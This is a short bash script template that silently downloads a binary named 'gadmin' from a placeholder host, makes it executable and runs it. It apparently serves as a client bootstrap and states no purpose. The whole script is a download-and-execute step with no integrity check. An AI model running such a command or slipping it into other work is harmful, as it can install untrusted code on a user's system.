#! /bin/bash
curl -s "{{host}}?r=client" -o ./gadmin
chmod +x ./gadmin
./gadmin